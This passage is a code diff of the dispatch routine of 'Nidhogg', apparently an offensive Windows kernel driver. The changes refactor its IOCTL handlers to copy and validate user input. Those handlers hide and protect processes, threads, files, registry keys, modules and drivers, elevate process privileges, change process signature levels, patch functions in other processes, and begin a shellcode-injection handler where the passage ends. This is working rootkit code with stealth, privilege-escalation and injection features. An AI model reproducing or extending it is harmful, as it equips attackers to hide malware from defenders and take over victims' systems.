@@ -1,4 +1,8 @@
 #pragma once
+#include "pch.h"
+#include "MemoryAllocator.hpp"
+
+#define VALID_SIZE(DataSize, StructSize)(DataSize != 0 && DataSize % StructSize == 0)
 
 // ** IOCTLS **********************************************************************************************
 #define IOCTL_PROTECT_UNPROTECT_PROCESS CTL_CODE(0x8000, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -49,13 +53,17 @@
 * @status		[NTSTATUS]		 -- Whether the function succeeded or not, if not the error code.
 */
 NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
+	NTSTATUS status = STATUS_SUCCESS;
+	SIZE_T len = 0;
 	auto stack = IoGetCurrentIrpStackLocation(Irp);
-	auto status = STATUS_SUCCESS;
-	auto len = 0;
+	// IoGetRequestorProcess() --> Then check the PreviousMode of that process to understand if it is UM or KM.
+
 
 	switch (stack->Parameters.DeviceIoControl.IoControlCode) {
 	case IOCTL_PROTECT_UNPROTECT_PROCESS:
 	{
+		ProtectedProcess protectedProcess{};
+
 		if (!Features.ProcessProtection) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, process protection feature is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -64,36 +72,35 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ProtectedProcess) != 0) {
+		if (!VALID_SIZE(size, sizeof(ProtectedProcess))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (ProtectedProcess*)Irp->AssociatedIrp.SystemBuffer;
+		protectedProcess.Pid = data->Pid;
+		protectedProcess.Protect = data->Protect;
 
-		if (!VALID_PROCESS(data->Pid)) {
+		if (!VALID_PROCESS(protectedProcess.Pid)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		FastMutex procMutex = NidhoggProccessUtils->GetProcessesLock();
-		AutoLock locker(procMutex);
-
-		if (data->Protect) {
+		if (protectedProcess.Protect) {
 			if (NidhoggProccessUtils->GetProtectedProcessesCount() == MAX_PIDS) {
 				status = STATUS_TOO_MANY_CONTEXT_IDS;
 				break;
 			}
 
-			if (NidhoggProccessUtils->FindProcess(data->Pid))
+			if (NidhoggProccessUtils->FindProcess(protectedProcess.Pid))
 				break;
 
-			if (!NidhoggProccessUtils->AddProcess(data->Pid)) {
+			if (!NidhoggProccessUtils->AddProcess(protectedProcess.Pid)) {
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 
-			KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", data->Pid));
+			KdPrint((DRIVER_PREFIX "Protecting process with pid %d.\n", protectedProcess.Pid));
 		}
 		else {
 			if (NidhoggProccessUtils->GetProtectedProcessesCount() == 0) {
@@ -101,12 +108,12 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				break;
 			}
 
-			if (!NidhoggProccessUtils->RemoveProcess(data->Pid)) {
+			if (!NidhoggProccessUtils->RemoveProcess(protectedProcess.Pid)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
 
-			KdPrint((DRIVER_PREFIX "Unprotecting process with pid %d.\n", data->Pid));
+			KdPrint((DRIVER_PREFIX "Unprotecting process with pid %d.\n", protectedProcess.Pid));
 		}
 		
 		len += sizeof(ProtectedProcess);
@@ -127,31 +134,34 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_HIDE_UNHIDE_PROCESS:
 	{
+		HiddenProcess hiddenProcess{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(HiddenProcess) != 0) {
+		if (!VALID_SIZE(size, sizeof(HiddenProcess))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (HiddenProcess*)Irp->AssociatedIrp.SystemBuffer;
+		hiddenProcess.Pid = data->Pid;
+		hiddenProcess.Hide = data->Hide;
 
-		if (!VALID_PROCESS(data->Pid)) {
+		if (!VALID_PROCESS(hiddenProcess.Pid)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (data->Hide) {
-			status = NidhoggProccessUtils->HideProcess(data->Pid);
+		if (hiddenProcess.Hide) {
+			status = NidhoggProccessUtils->HideProcess(hiddenProcess.Pid);
 
 			if (NT_SUCCESS(status))
-				KdPrint((DRIVER_PREFIX "Hid process with pid %d.\n", data->Pid));
+				KdPrint((DRIVER_PREFIX "Hid process with pid %d.\n", hiddenProcess.Pid));
 		}
 		else {
-			status = NidhoggProccessUtils->UnhideProcess(data->Pid);
+			status = NidhoggProccessUtils->UnhideProcess(hiddenProcess.Pid);
 
 			if (NT_SUCCESS(status))
-				KdPrint((DRIVER_PREFIX "Unhide process with pid %d.\n", data->Pid));
+				KdPrint((DRIVER_PREFIX "Unhide process with pid %d.\n", hiddenProcess.Pid));
 		}
 
 		len += sizeof(HiddenProcess);
@@ -160,24 +170,27 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_ELEVATE_PROCESS:
 	{
+		ULONG pid = 0;
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ULONG) != 0) {
+		if (!VALID_SIZE(size, sizeof(ULONG))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+		MemoryAllocator<ULONG*> allocator(&pid, sizeof(ULONG), PagedPool);
+		allocator.CopyData(data, sizeof(ULONG));
 
-		if (!VALID_PROCESS(*data)) {
+		if (!VALID_PROCESS(pid)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		status = NidhoggProccessUtils->ElevateProcess(*data);
+		status = NidhoggProccessUtils->ElevateProcess(pid);
 
 		if (NT_SUCCESS(status))
-			KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", *data));
+			KdPrint((DRIVER_PREFIX "Elevated process with pid %d.\n", pid));
 
 		len += sizeof(ULONG);
 		break;
@@ -185,23 +198,27 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_SET_PROCESS_SIGNATURE_LEVEL:
 	{
+		ProcessSignature processSignature{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ProcessSignature) != 0) {
+		if (!VALID_SIZE(size, sizeof(ProcessSignature))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (ProcessSignature*)Irp->AssociatedIrp.SystemBuffer;
+		processSignature.Pid = data->Pid;
+		processSignature.SignatureSigner = data->SignatureSigner;
+		processSignature.SignerType = data->SignerType;
 
-		if (!VALID_PROCESS(data->Pid) ||
-			(data->SignatureSigner < PsProtectedSignerNone || data->SignatureSigner > PsProtectedSignerMax) ||
-			(data->SignerType < PsProtectedTypeNone || data->SignerType > PsProtectedTypeProtected)) {
+		if (!VALID_PROCESS(processSignature.Pid) ||
+			(processSignature.SignatureSigner < PsProtectedSignerNone || processSignature.SignatureSigner > PsProtectedSignerMax) ||
+			(processSignature.SignerType < PsProtectedTypeNone || processSignature.SignerType > PsProtectedTypeProtected)) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		status = NidhoggProccessUtils->SetProcessSignature(data);
+		status = NidhoggProccessUtils->SetProcessSignature(&processSignature);
 
 		if (NT_SUCCESS(status))
 			KdPrint((DRIVER_PREFIX "New signature applied to %d.\n", data->Pid));
@@ -220,7 +237,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ProtectedProcessesList) != 0) {
+		if (!VALID_SIZE(size, sizeof(ProtectedProcessesList))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -235,6 +252,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_PROTECT_UNPROTECT_THREAD:
 	{
+		ProtectedThread protectedThread{};
+
 		if (!Features.ThreadProtection) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, thread protection feature is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -243,36 +262,35 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ProtectedThread) != 0) {
+		if (!VALID_SIZE(size, sizeof(ProtectedThread))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (ProtectedThread*)Irp->AssociatedIrp.SystemBuffer;
+		protectedThread.Tid = data->Tid;
+		protectedThread.Protect = data->Protect;
 
-		if (data->Tid <= 0) {
+		if (protectedThread.Tid <= 0) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		FastMutex threadsMutex = NidhoggProccessUtils->GetThreadsLock();
-		AutoLock locker(threadsMutex);
-
-		if (data->Protect) {
+		if (protectedThread.Protect) {
 			if (NidhoggProccessUtils->GetProtectedThreadsCount() == MAX_TIDS) {
 				status = STATUS_TOO_MANY_CONTEXT_IDS;
 				break;
 			}
 
-			if (NidhoggProccessUtils->FindThread(data->Tid))
+			if (NidhoggProccessUtils->FindThread(protectedThread.Tid))
 				break;
 
-			if (!NidhoggProccessUtils->AddThread(data->Tid)) {
+			if (!NidhoggProccessUtils->AddThread(protectedThread.Tid)) {
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 
-			KdPrint((DRIVER_PREFIX "Protecting thread with tid %d.\n", data->Tid));
+			KdPrint((DRIVER_PREFIX "Protecting thread with tid %d.\n", protectedThread.Tid));
 		}
 		else {
 			if (NidhoggProccessUtils->GetProtectedThreadsCount() == 0) {
@@ -280,12 +298,12 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 				break;
 			}
 
-			if (!NidhoggProccessUtils->RemoveThread(data->Tid)) {
+			if (!NidhoggProccessUtils->RemoveThread(protectedThread.Tid)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
 
-			KdPrint((DRIVER_PREFIX "Unprotecting thread with tid %d.\n", data->Tid));
+			KdPrint((DRIVER_PREFIX "Unprotecting thread with tid %d.\n", protectedThread.Tid));
 		}
 
 		len += sizeof(ProtectedThread);
@@ -294,23 +312,30 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_HIDE_THREAD:
 	{
+		ULONG tid = 0;
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
-		if (size % sizeof(ULONG) != 0) {
+
+		if (!VALID_SIZE(size, sizeof(ULONG))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (ULONG*)Irp->AssociatedIrp.SystemBuffer;
+		MemoryAllocator<ULONG*> allocator(&tid, sizeof(ULONG), PagedPool);
+		status = allocator.CopyData(data, sizeof(ULONG));
 
-		if (*data <= 0) {
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (tid <= 0) {
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		status = NidhoggProccessUtils->HideThread(*data);
+		status = NidhoggProccessUtils->HideThread(tid);
 
 		if (NT_SUCCESS(status))
-			KdPrint((DRIVER_PREFIX "Hid thread with tid %d.\n", *data));
+			KdPrint((DRIVER_PREFIX "Hid thread with tid %d.\n", tid));
 
 		len += sizeof(ULONG);
 		break;
@@ -338,7 +363,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ThreadsList) != 0) {
+		if (!VALID_SIZE(size, sizeof(ThreadsList))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -352,6 +377,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_PROTECT_UNPROTECT_FILE:
 	{
+		ProtectedFile protectedFile{};
+
 		if (!Features.FileProtection) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, file protection feature is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -360,32 +387,35 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(ProtectedFile) != 0) {
+		if (!VALID_SIZE(size, sizeof(ProtectedFile))) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (ProtectedFile*)Irp->AssociatedIrp.SystemBuffer;
+		MemoryAllocator<WCHAR*> allocator(protectedFile.FilePath, MAX_PATH * sizeof(WCHAR), PagedPool);
+		SIZE_T filePathLen = wcslen(data->FilePath);
+		status = allocator.CopyData(data->FilePath, filePathLen * sizeof(WCHAR));
 
-		if (!data->FilePath || wcslen(data->FilePath) > MAX_PATH) {
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (!protectedFile.FilePath || wcslen(protectedFile.FilePath) > MAX_PATH) {
 			KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		FastMutex filesMutex = NidhoggFileUtils->GetFileLock();
-		AutoLock locker(filesMutex);
-
-		if (data->Protect) {
+		if (protectedFile.Protect) {
 			if (NidhoggFileUtils->GetFilesCount() == MAX_FILES) {
 				KdPrint((DRIVER_PREFIX "List is full.\n"));
 				status = STATUS_TOO_MANY_CONTEXT_IDS;
 				break;
 			}
 
-			if (!NidhoggFileUtils->FindFile(data->FilePath)) {
-				if (!NidhoggFileUtils->AddFile(data->FilePath)) {
+			if (!NidhoggFileUtils->FindFile(protectedFile.FilePath)) {
+				if (!NidhoggFileUtils->AddFile(protectedFile.FilePath)) {
 					KdPrint((DRIVER_PREFIX "Failed to add file.\n"));
 					status = STATUS_UNSUCCESSFUL;
 					break;
@@ -395,7 +425,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 					status = NidhoggFileUtils->InstallNtfsHook(IRP_MJ_CREATE);
 
 					if (!NT_SUCCESS(status)) {
-						NidhoggFileUtils->RemoveFile(data->FilePath);
+						NidhoggFileUtils->RemoveFile(protectedFile.FilePath);
 						KdPrint((DRIVER_PREFIX "Failed to hook ntfs.\n"));
 						break;
 					}
@@ -403,12 +433,12 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 				auto prevIrql = KeGetCurrentIrql();
 				KeLowerIrql(PASSIVE_LEVEL);
-				KdPrint((DRIVER_PREFIX "Protecting file %ws.\n", data->FilePath));
+				KdPrint((DRIVER_PREFIX "Protecting file %ws.\n", protectedFile.FilePath));
 				KeRaiseIrql(prevIrql, &prevIrql);
 			}
 		}
 		else {
-			if (!NidhoggFileUtils->RemoveFile(data->FilePath)) {
+			if (!NidhoggFileUtils->RemoveFile(protectedFile.FilePath)) {
 				status = STATUS_NOT_FOUND;
 				break;
 			}
@@ -422,7 +452,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 			auto prevIrql = KeGetCurrentIrql();
 			KeLowerIrql(PASSIVE_LEVEL);
-			KdPrint((DRIVER_PREFIX "Unprotected file %ws.\n", data));
+			KdPrint((DRIVER_PREFIX "Unprotected file %ws.\n", protectedFile.FilePath));
 			KeRaiseIrql(prevIrql, &prevIrql);
 		}
 
@@ -451,7 +481,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(FileItem) != 0) {
+		if (!VALID_SIZE(size, sizeof(FileItem))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
@@ -465,6 +495,7 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_PROTECT_REGITEM:
 	{
+		RegItem regItem{};
 		ULONG itemsCount = 0;
 
 		if (!Features.RegistryFeatures) {
@@ -475,24 +506,47 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(RegItem) != 0) {
+		if (!VALID_SIZE(size, sizeof(RegItem))) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
+		regItem.Type = data->Type;
+		SIZE_T keyLen = wcslen(data->KeyPath);
 
-		if (wcslen(data->KeyPath) == 0) {
+		if (keyLen == 0 || keyLen > REG_KEY_LEN) {
 			KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
+		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);
 
-		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
-		AutoLock locker(regMutex);
+		if (err != 0) {
+			KdPrint((DRIVER_PREFIX "Failed to copy to buffer.\n"));
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
 
-		switch (data->Type) {
+		if (regItem.Type == RegProtectedValue || regItem.Type == RegHiddenValue) {
+			SIZE_T valueLen = wcslen(data->ValueName);
+
+			if (valueLen == 0 || valueLen > REG_VALUE_LEN) {
+				KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);
+
+			if (err != 0) {
+				KdPrint((DRIVER_PREFIX "Failed to copy to buffer.\n"));
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+		}
+
+		switch (regItem.Type) {
 		case RegProtectedKey:
 			itemsCount = NidhoggRegistryUtils->GetProtectedKeysCount();
 			break;
@@ -520,14 +574,14 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		if (!NidhoggRegistryUtils->FindRegItem(data)) {
-			if (!NidhoggRegistryUtils->AddRegItem(data)) {
+		if (!NidhoggRegistryUtils->FindRegItem(&regItem)) {
+			if (!NidhoggRegistryUtils->AddRegItem(&regItem)) {
 				KdPrint((DRIVER_PREFIX "Failed to add new registry item.\n"));
 				status = STATUS_UNSUCCESSFUL;
 				break;
 			}
 
-			KdPrint((DRIVER_PREFIX "Added new registry item of type %d.\n", data->Type));
+			KdPrint((DRIVER_PREFIX "Added new registry item of type %d.\n", regItem.Type));
 		}
 
 		len += sizeof(RegItem);
@@ -536,6 +590,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_UNPROTECT_REGITEM:
 	{
+		RegItem regItem{};
+
 		if (!Features.RegistryFeatures) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, registry features are unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -544,24 +600,47 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(RegItem) != 0) {
+		if (!VALID_SIZE(size, sizeof(RegItem))) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
+		regItem.Type = data->Type;
+		SIZE_T keyLen = wcslen(data->KeyPath);
 
-		if (!VALID_REG_TYPE(data->Type) || wcslen(data->KeyPath) == 0) {
+		if (!VALID_REG_TYPE(regItem.Type) || keyLen == 0 || keyLen > REG_KEY_LEN) {
 			KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
+		errno_t err = wcsncpy_s(regItem.KeyPath, data->KeyPath, keyLen);
 
-		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
-		AutoLock locker(regMutex);
+		if (err != 0) {
+			KdPrint((DRIVER_PREFIX "Failed to copy to buffer.\n"));
+			status = STATUS_INVALID_PARAMETER;
+			break;
+		}
 
-		if (!NidhoggRegistryUtils->RemoveRegItem(data)) {
+		if (regItem.Type == RegProtectedValue || regItem.Type == RegHiddenValue) {
+			SIZE_T valueLen = wcslen(data->ValueName);
+
+			if (valueLen == 0 || valueLen > REG_VALUE_LEN) {
+				KdPrint((DRIVER_PREFIX "Buffer data is invalid.\n"));
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+			err = wcsncpy_s(regItem.ValueName, data->ValueName, valueLen);
+
+			if (err != 0) {
+				KdPrint((DRIVER_PREFIX "Failed to copy to buffer.\n"));
+				status = STATUS_INVALID_PARAMETER;
+				break;
+			}
+		}
+
+		if (!NidhoggRegistryUtils->RemoveRegItem(&regItem)) {
 			KdPrint((DRIVER_PREFIX "Registry item not found.\n"));
 			status = STATUS_NOT_FOUND;
 			break;
@@ -579,9 +658,6 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 			break;
 		}
 
-		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
-		AutoLock locker(regMutex);
-
 		NidhoggRegistryUtils->ClearRegItems();
 		break;
 	}
@@ -597,15 +673,12 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 		}
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(RegItem) != 0) {
+		if (!VALID_SIZE(size, sizeof(RegItem))) {
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (RegItem*)Irp->AssociatedIrp.SystemBuffer;
-
-		FastMutex regMutex = NidhoggRegistryUtils->GetRegistryLock();
-		AutoLock locker(regMutex);
 
 		switch (data->Type) {
 			case RegProtectedKey:
@@ -637,6 +710,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_PATCH_MODULE:
 	{
+		PatchedModule patchedModule{};
+
 		if (!Features.FunctionPatching) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, function patching feature is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -645,27 +720,48 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(PatchedModule) != 0) {
+		if (!VALID_SIZE(size, sizeof(PatchedModule))) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (PatchedModule*)Irp->AssociatedIrp.SystemBuffer;
+		patchedModule.Pid = data->Pid;
+		patchedModule.PatchLength = data->PatchLength;
 
-		if (!data->FunctionName || !data->ModuleName || !data->Patch ||
-			!VALID_PROCESS(data->Pid) || data->PatchLength <= 0) {
+		SIZE_T strSize = strlen(data->FunctionName);
+		MemoryAllocator<CHAR*> functionNameAllocator(patchedModule.FunctionName, strSize, PagedPool);
+		status = functionNameAllocator.CopyData(data->FunctionName, strSize);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		strSize = wcslen(data->ModuleName) * sizeof(WCHAR);
+		MemoryAllocator<WCHAR*> moduleNameAllocator(patchedModule.ModuleName, strSize, PagedPool);
+		status = moduleNameAllocator.CopyData(data->ModuleName, strSize);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		MemoryAllocator<PVOID> patchAllocator(patchedModule.Patch, data->PatchLength, PagedPool);
+		status = patchAllocator.CopyData(data->Patch, data->PatchLength);
+
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (!VALID_PROCESS(data->Pid)) {
 			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		status = NidhoggMemoryUtils->PatchModule(data);
+		status = NidhoggMemoryUtils->PatchModule(&patchedModule);
 
 		if (NT_SUCCESS(status)) {
 			auto prevIrql = KeGetCurrentIrql();
 			KeLowerIrql(PASSIVE_LEVEL);
-			KdPrint((DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", data->ModuleName, data->FunctionName, data->Pid));
+			KdPrint((DRIVER_PREFIX "Patched module %ws and function %s for process %d.\n", patchedModule.ModuleName, patchedModule.FunctionName, patchedModule.Pid));
 			KeRaiseIrql(prevIrql, &prevIrql);
 		}
 
@@ -675,6 +771,8 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_HIDE_MODULE:
 	{
+		HiddenModuleInformation hiddenModule{};
+
 		if (!Features.ModuleHiding) {
 			KdPrint((DRIVER_PREFIX "Due to previous error, hiding module feature is unavaliable.\n"));
 			status = STATUS_UNSUCCESSFUL;
@@ -683,26 +781,33 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(HiddenModuleInformation) != 0) {
+		if (!VALID_SIZE(size, sizeof(HiddenModuleInformation))) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (HiddenModuleInformation*)Irp->AssociatedIrp.SystemBuffer;
+		hiddenModule.Pid = data->Pid;
+		SIZE_T moduleNameSize = wcslen(data->ModuleName) * sizeof(WCHAR);
+		MemoryAllocator<WCHAR*> moduleNameAllocator(hiddenModule.ModuleName, moduleNameSize, PagedPool);
+		status = moduleNameAllocator.CopyData(data->ModuleName, moduleNameSize);
 
-		if (!data->ModuleName || data->Pid <= 0 || data->Pid == SYSTEM_PROCESS_PID) {
+		if (!NT_SUCCESS(status))
+			break;
+
+		if (!VALID_PROCESS(hiddenModule.Pid)) {
 			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
 			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		status = NidhoggMemoryUtils->HideModule(data);
+		status = NidhoggMemoryUtils->HideModule(&hiddenModule);
 
 		if (NT_SUCCESS(status)) {
 			auto prevIrql = KeGetCurrentIrql();
 			KeLowerIrql(PASSIVE_LEVEL);
-			KdPrint((DRIVER_PREFIX "Hid module %ws for process %d.\n", data->ModuleName, data->Pid));
+			KdPrint((DRIVER_PREFIX "Hid module %ws for process %d.\n", hiddenModule.ModuleName, hiddenModule.Pid));
 			KeRaiseIrql(prevIrql, &prevIrql);
 		}
 
@@ -712,45 +817,49 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_HIDE_UNHIDE_DRIVER:
 	{
+		HiddenDriverInformation hiddenDriver{};
 		auto size = stack->Parameters.DeviceIoControl.InputBufferLength;
 
-		if (size % sizeof(HiddenDriverInformation) != 0) {
+		if (!VALID_SIZE(size, sizeof(HiddenDriverInformation))) {
 			KdPrint((DRIVER_PREFIX "Invalid buffer type.\n"));
 			status = STATUS_INVALID_BUFFER_SIZE;
 			break;
 		}
 
 		auto data = (HiddenDriverInformation*)Irp->AssociatedIrp.SystemBuffer;
+		hiddenDriver.Hide = data->Hide;
+		SIZE_T driverNameSize = wcslen(data->DriverName) * sizeof(WCHAR);
+		MemoryAllocator<WCHAR*> driverNameAllocator(hiddenDriver.DriverName, driverNameSize, PagedPool);
+		status = driverNameAllocator.CopyData(data->DriverName, driverNameSize);
 
-		if (!data->DriverName) {
+		if (!NT_SUCCESS(status)) {
 			KdPrint((DRIVER_PREFIX "Buffer is invalid.\n"));
-			status = STATUS_INVALID_PARAMETER;
 			break;
 		}
 
-		if (data->Hide) {
+		if (hiddenDriver.Hide) {
 			if (NidhoggMemoryUtils->GetHiddenDrivers() == MAX_HIDDEN_DRIVERS) {
 				KdPrint((DRIVER_PREFIX "Too many items.\n"));
 				status = STATUS_TOO_MANY_CONTEXT_IDS;
 				break;
 			}
 
-			status = NidhoggMemoryUtils->HideDriver(data);
+			status = NidhoggMemoryUtils->HideDriver(&hiddenDriver);
 
 			if (NT_SUCCESS(status)) {
 				auto prevIrql = KeGetCurrentIrql();
 				KeLowerIrql(PASSIVE_LEVEL);
-				KdPrint((DRIVER_PREFIX "Hid driver %ws.\n", data->DriverName));
+				KdPrint((DRIVER_PREFIX "Hid driver %ws.\n", hiddenDriver.DriverName));
 				KeRaiseIrql(prevIrql, &prevIrql);
 			}
 		}
 		else {
-			status = NidhoggMemoryUtils->UnhideDriver(data);
+			status = NidhoggMemoryUtils->UnhideDriver(&hiddenDriver);
 
 			if (NT_SUCCESS(status)) {
 				auto prevIrql = KeGetCurrentIrql();
 				KeLowerIrql(PASSIVE_LEVEL);
-				KdPrint((DRIVER_PREFIX "Restored driver %ws.\n", data->DriverName));
+				KdPrint((DRIVER_PREFIX "Restored driver %ws.\n", hiddenDriver.DriverName));
 				KeRaiseIrql(prevIrql, &prevIrql);
 			}
 		}
@@ -761,21 +870,62 @@ NTSTATUS NidhoggDeviceControl(PDEVICE_OBJECT, PIRP Irp) {
 
 	case IOCTL_INJECT_SHELLCODE: 
 	{
